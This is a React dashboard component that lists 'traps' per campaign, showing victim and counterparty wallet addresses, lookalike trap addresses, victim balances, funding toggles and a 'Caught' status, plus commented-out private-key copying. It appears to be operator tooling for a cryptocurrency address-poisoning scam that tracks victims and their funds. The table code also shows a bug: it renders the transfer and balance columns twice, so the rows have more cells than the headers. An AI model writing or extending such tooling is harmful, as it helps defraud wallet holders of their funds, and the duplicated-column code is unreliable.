// apas-frontend/components/TrapsList.tsx

'use client';

import { useState, useEffect } from 'react';
import { RefreshCw, Copy, Check, ChevronLeft, ChevronRight, Trash2, Search } from 'lucide-react';

interface Trap {
  id: string;
  victim_address: string;
  counterparty_address: string | null;
  trap_address: string;
  is_caught: boolean;
  funding_enabled: boolean;
  victim_balance?: {
    native: string;
    tokens: Record<string, string>;
  };
  last_transfer_at?: string | null;
}

interface Balance {
  trapAddress: string;
  native: string;
  tokens: Record<string, string>;
}

export default function TrapsList({
  campaignId,
  initialBalances = [],
  traps: initialTraps = [],
  balancesEnabled = true,
}: {
  campaignId: string;
  initialBalances?: Balance[];
  traps?: Trap[];
  balancesEnabled?: boolean;
}) {
  // ─── State ───
  const [traps, setTraps] = useState<Trap[]>(initialTraps);
  const [total, setTotal] = useState(initialTraps.length);
  const [limit] = useState(20);
  const [offset, setOffset] = useState(0);
  const [balances, setBalances] = useState<Record<string, Balance>>(() => {
    const map: Record<string, Balance> = {};
    for (const b of initialBalances) {
      map[b.trapAddress.toLowerCase()] = b;
    }
    return map;
  });
  const [loading, setLoading] = useState(initialTraps.length === 0);
  const [refreshing, setRefreshing] = useState(false);
  const [copying, setCopying] = useState<Record<string, boolean>>({});
  const [copiedCells, setCopiedCells] = useState<Record<string, boolean>>({});
  const [deleting, setDeleting] = useState<Record<string, boolean>>({});
  const [toggling, setToggling] = useState<Record<string, boolean>>({});
  const [search, setSearch] = useState('');
  const [activeSearch, setActiveSearch] = useState('');


  const toggleFunding = async (trapId: string, currentStatus: boolean) => {
    setToggling((prev) => ({ ...prev, [trapId]: true }));
    try {
      const res = await fetch(`/api/traps/${trapId}/funding-toggle`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ funding_enabled: !currentStatus }),
      });
      if (!res.ok) {
        const error = await res.json();
        alert('Failed to update funding: ' + (error.error || 'Unknown error'));
        return;
      }
      const updated = await res.json();
      setTraps((prev) =>
        prev.map((t) => (t.id === trapId ? { ...t, funding_enabled: updated.funding_enabled } : t))
      );
    } catch (err) {
      alert('Network error');
    } finally {
      setToggling((prev) => ({ ...prev, [trapId]: false }));
    }
  };

  const handleSearchSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setActiveSearch(search);
    setOffset(0); // Reset to page 1 when searching
  };

  const clearSearch = () => {
    setSearch('');
    setActiveSearch('');
    setOffset(0);
  };

  // ─── Fetch traps (paginated) ───
  const fetchTraps = async (showLoading = true, currentSearch: string = activeSearch) => {
    if (showLoading) setLoading(true);
    else setRefreshing(true);
    try {
      const searchQuery = currentSearch ? `&search=${encodeURIComponent(currentSearch)}` : '';
      const res = await fetch(`/api/campaigns/${campaignId}/traps?limit=${limit}&offset=${offset}${searchQuery}`);
      if (res.ok) {
        const data = await res.json();
        setTraps(data.traps || []);
        setTotal(data.total || 0);
      } else {
        console.warn('[TrapsList] Failed to fetch traps, status:', res.status);
      }
    } catch (e) {
      console.error('[TrapsList] Error fetching traps:', e);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  // ─── Fetch balances ───
  const fetchBalances = async () => {
    if (!balancesEnabled) return;
    try {
      const res = await fetch(`/api/campaigns/${campaignId}/balances`);
      if (res.ok) {
        const data = await res.json();
        const map: Record<string, Balance> = {};
        for (const b of data.balances) {
          map[b.trapAddress.toLowerCase()] = b;
        }
        setBalances(map);
      }
    } catch (e) {
      console.error('Failed to fetch balances:', e);
    }
  };

  // ─── Combined refresh ───
  const refreshAll = async () => {
    setRefreshing(true);
    try {
      await Promise.all([fetchTraps(false), fetchBalances()]);
    } catch (e) {
      console.error('Refresh error:', e);
    } finally {
      setRefreshing(false);
    }
  };

  // ─── Delete trap ───
  const deleteTrap = async (trapId: string) => {
    if (!confirm('Are you sure you want to delete this trap? This action cannot be undone.')) return;
    setDeleting((prev) => ({ ...prev, [trapId]: true }));
    try {
      const res = await fetch(`/api/traps/${trapId}`, { method: 'DELETE' });
      if (!res.ok) {
        const error = await res.json();
        alert('Failed to delete trap: ' + (error.error || 'Unknown error'));
        return;
      }
      // Remove from state using functional update
      setTraps((prev) => prev.filter((t) => t.id !== trapId));
      setTotal((prev) => Math.max(0, prev - 1));
    } catch {
      alert('Network error');
    } finally {
      setDeleting((prev) => ({ ...prev, [trapId]: false }));
    }
  };

  // ─── Initial load and polling ───
  useEffect(() => {
    fetchTraps(true, activeSearch);
    if (balancesEnabled) {
      fetchBalances();
      const interval = setInterval(() => {
        fetchTraps(false, activeSearch);
        fetchBalances();
      }, 30000);
      return () => clearInterval(interval);
    } else {
      const interval = setInterval(() => {
        fetchTraps(false, activeSearch);
      }, 30000);
      return () => clearInterval(interval);
    }
  }, [campaignId, offset, activeSearch, balancesEnabled]);

  const getBalance = (trapAddress: string) => {
    return balances[trapAddress.toLowerCase()] || null;
  };

  // ─── Copy private key (existing) ───
  const copyPrivateKey = async (trapId: string, trapAddress: string) => {
    setCopying((prev) => ({ ...prev, [trapId]: true }));
    try {
      const res = await fetch(`/api/traps/${trapId}/key`);
      if (!res.ok) {
        const error = await res.json();
        alert('Failed to fetch private key: ' + (error.error || 'Unknown error'));
        return;
      }
      const data = await res.json();
      await navigator.clipboard.writeText(data.privateKey);
      const key = `copied_${trapId}`;
      setCopying((prev) => ({ ...prev, [key]: true }));
      setTimeout(() => {
        setCopying((prev) => ({ ...prev, [key]: false }));
      }, 3000);
    } catch (err) {
      alert('Error copying private key: ' + (err as Error).message);
    } finally {
      setCopying((prev) => ({ ...prev, [trapId]: false }));
    }
  };

  // ─── Copy address helper ───
  const copyAddress = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCells((prev) => ({ ...prev, [key]: true }));
    setTimeout(() => {
      setCopiedCells((prev) => ({ ...prev, [key]: false }));
    }, 2000);
  };

  const totalPages = Math.ceil(total / limit);
  const currentPage = Math.floor(offset / limit) + 1;

  return (
    <div>
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-4">
        <h3 className="text-lg font-semibold text-white">Traps ({total})</h3>

        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 w-full sm:w-auto">
          {/* Search Bar */}
          <form onSubmit={handleSearchSubmit} className="flex items-center gap-2 flex-1 sm:flex-none">
            <div className="relative flex-1 sm:w-64">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={16} />
              <input
                type="text"
                placeholder="Search addresses..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full pl-9 pr-8 py-1.5 bg-gray-800/50 border border-gray-700 rounded-lg text-sm text-gray-200 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50"
              />
              {search && (
                <button
                  type="button"
                  onClick={clearSearch}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                >
                  ×
                </button>
              )}
            </div>
            <button
              type="submit"
              className="px-3 py-1.5 bg-blue-600/20 text-blue-400 border border-blue-600/30 rounded-lg hover:bg-blue-600/30 transition-colors text-sm font-medium"
            >
              Search
            </button>
          </form>

          {/* Refresh & Pagination */}
          <div className="flex items-center gap-3">
            <button
              onClick={refreshAll}
              disabled={refreshing}
              className="flex items-center gap-2 px-3 py-1.5 bg-gray-700/50 text-gray-300 rounded-lg hover:bg-gray-600/50 transition-colors disabled:opacity-50 text-sm"
            >
              <RefreshCw size={14} className={refreshing ? 'animate-spin' : ''} />
              <span className="hidden sm:inline">Refresh</span>
            </button>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <button
                onClick={() => setOffset(Math.max(0, offset - limit))}
                disabled={offset === 0}
                className="p-1 rounded hover:bg-gray-700 disabled:opacity-50"
              >
                <ChevronLeft size={16} />
              </button>
              <span>Page {currentPage} of {totalPages || 1}</span>
              <button
                onClick={() => setOffset(offset + limit)}
                disabled={offset + limit >= total}
                className="p-1 rounded hover:bg-gray-700 disabled:opacity-50"
              >
                <ChevronRight size={16} />
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-2xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead className="bg-gray-900/50 border-b border-gray-700">
              <tr>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Victim</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Counterparty</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Trap Address</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Victim Balance</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Last Transfer</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Native</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">USDC</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">USDT</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Status</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Funding</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-700">
              {loading ? (
                <tr>
                  <td colSpan={11} className="px-4 py-6 text-center text-gray-400">Loading traps...</td>
                </tr>
              ) : traps.length === 0 ? (
                <tr>
                  <td colSpan={11} className="px-4 py-6 text-center text-gray-400">
                    {activeSearch ? 'No traps match your search.' : 'No traps found.'}
                  </td>
                </tr>
              ) : (
                traps.map((trap) => {
                  const balance = getBalance(trap.trap_address);
                  const isCopying = copying[trap.id] || false;
                  const isCopied = copying[`copied_${trap.id}`] || false;
                  const isDeleting = deleting[trap.id] || false;

                  const victimCopied = copiedCells[`victim-${trap.id}`] || false;
                  const counterpartyCopied = copiedCells[`counterparty-${trap.id}`] || false;
                  const trapCopied = copiedCells[`trap-${trap.id}`] || false;

                  const victimBalance = trap.victim_balance;
                  const lastTransfer = trap.last_transfer_at;

                  return (
                    <tr key={trap.id} className="hover:bg-gray-700/20 transition-colors">
                      {/* Victim Address */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1">
                          <span className="text-gray-300 font-mono text-xs">
                            {trap.victim_address.slice(0, 10)}…{trap.victim_address.slice(-8)}
                          </span>
                          <button
                            onClick={() => copyAddress(trap.victim_address, `victim-${trap.id}`)}
                            className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
                            title="Copy address"
                          >
                            {victimCopied ? (
                              <Check size={12} className="text-green-400" />
                            ) : (
                              <Copy size={12} className="text-gray-400 hover:text-white" />
                            )}
                          </button>
                        </div>
                      </td>

                      {/* Counterparty Address */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1">
                          {trap.counterparty_address ? (
                            <>
                              <span className="text-gray-400 font-mono text-xs">
                                {trap.counterparty_address.slice(0, 10)}…{trap.counterparty_address.slice(-8)}
                              </span>
                              <button
                                onClick={() => copyAddress(trap.counterparty_address!, `counterparty-${trap.id}`)}
                                className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
                                title="Copy address"
                              >
                                {counterpartyCopied ? (
                                  <Check size={12} className="text-green-400" />
                                ) : (
                                  <Copy size={12} className="text-gray-400 hover:text-white" />
                                )}
                              </button>
                            </>
                          ) : (
                            <span className="text-gray-500">Wildcard</span>
                          )}
                        </div>
                      </td>

                      {/* Trap Address */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1">
                          <span className="text-gray-300 font-mono text-xs">
                            {trap.trap_address.slice(0, 10)}…{trap.trap_address.slice(-8)}
                          </span>
                          <button
                            onClick={() => copyAddress(trap.trap_address, `trap-${trap.id}`)}
                            className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
                            title="Copy address"
                          >
                            {trapCopied ? (
                              <Check size={12} className="text-green-400" />
                            ) : (
                              <Copy size={12} className="text-gray-400 hover:text-white" />
                            )}
                          </button>
                        </div>
                      </td>

                      {/* Victim Balance */}
                      <td className="px-4 py-3 text-gray-300">
                        {!balancesEnabled ? (
                          <span className="text-gray-600">Disabled</span>
                        ) : victimBalance ? (
                          <div className="text-xs">
                            <div className="text-green-400">{parseFloat(victimBalance.native).toFixed(6)} native</div>
                            {Object.entries(victimBalance.tokens).map(([symbol, amount]) => (
                              <div key={symbol} className="text-blue-400">
                                {parseFloat(amount).toFixed(4)} {symbol}
                              </div>
                            ))}
                          </div>
                        ) : (
                          <span className="text-gray-500">—</span>
                        )}
                      </td>

                      {/* Last Transfer */}
                      <td className="px-4 py-3 text-gray-400 text-xs">
                        {lastTransfer ? new Date(lastTransfer).toLocaleString() : '—'}
                      </td>

                      {/* Trap Balances */}
                      <td className="px-4 py-3 text-green-400 font-mono text-xs">
                        {!balancesEnabled ? (
                          <span className="text-gray-600">—</span>
                        ) : balance ? parseFloat(balance.native).toFixed(6) : '…'}
                      </td>
                      <td className="px-4 py-3 text-blue-400 font-mono text-xs">
                        {!balancesEnabled ? (
                          <span className="text-gray-600">—</span>
                        ) : balance ? parseFloat(balance.tokens.USDC || '0').toFixed(4) : '…'}
                      </td>
                      <td className="px-4 py-3 text-blue-400 font-mono text-xs">
                        {!balancesEnabled ? (
                          <span className="text-gray-600">—</span>
                        ) : balance ? parseFloat(balance.tokens.USDT || '0').toFixed(4) : '…'}
                      </td>

                      {/* Last Transfer */}
                      <td className="px-4 py-3 text-gray-400 text-xs">
                        {lastTransfer ? new Date(lastTransfer).toLocaleString() : '—'}
                      </td>

                      {/* Trap Balances */}
                      <td className="px-4 py-3 text-green-400 font-mono text-xs">
                        {balance ? parseFloat(balance.native).toFixed(6) : '…'}
                      </td>
                      <td className="px-4 py-3 text-blue-400 font-mono text-xs">
                        {balance ? parseFloat(balance.tokens.USDC || '0').toFixed(4) : '…'}
                      </td>
                      <td className="px-4 py-3 text-blue-400 font-mono text-xs">
                        {balance ? parseFloat(balance.tokens.USDT || '0').toFixed(4) : '…'}
                      </td>

                      {/* Status */}
                      <td className="px-4 py-3">
                        <span
                          className={`px-2 py-1 text-xs rounded-full ${trap.is_caught
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                            : 'bg-green-500/20 text-green-400 border border-green-500/30'
                            }`}
                        >
                          {trap.is_caught ? 'Caught' : 'Active'}
                        </span>
                      </td>

                      {/* Funding */}
                      <td className="px-4 py-3">
                        <button
                          onClick={() => toggleFunding(trap.id, trap.funding_enabled)}
                          disabled={toggling[trap.id]}
                          className={`px-2 py-1 text-xs rounded transition-colors ${trap.funding_enabled
                            ? 'bg-green-600/30 text-green-400 hover:bg-green-600/50'
                            : 'bg-red-600/30 text-red-400 hover:bg-red-600/50'
                            } disabled:opacity-50`}
                        >
                          {toggling[trap.id] ? '…' : trap.funding_enabled ? 'On' : 'Off'}
                        </button>
                      </td>

                      {/* Actions */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1">
                          {/* <button
                            onClick={() => copyPrivateKey(trap.id, trap.trap_address)}
                            disabled={isCopying}
                            className="flex items-center gap-1 px-2 py-1 text-xs bg-gray-700/50 hover:bg-gray-600/50 rounded transition-colors disabled:opacity-50"
                          >
                            {isCopied ? (
                              <>
                                <Check size={14} className="text-green-400" />
                                <span className="text-green-400">Copied!</span>
                              </>
                            ) : (
                              <>
                                <Copy size={14} />
                                <span>Copy Key</span>
                              </>
                            )}
                          </button> */}
                          <button
                            onClick={() => deleteTrap(trap.id)}
                            disabled={isDeleting}
                            className="flex items-center gap-1 px-2 py-1 text-xs bg-red-600/30 hover:bg-red-600/50 text-red-300 rounded transition-colors disabled:opacity-50"
                            title="Delete trap"
                          >
                            <Trash2 size={14} />
                            {isDeleting ? '…' : ''}
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}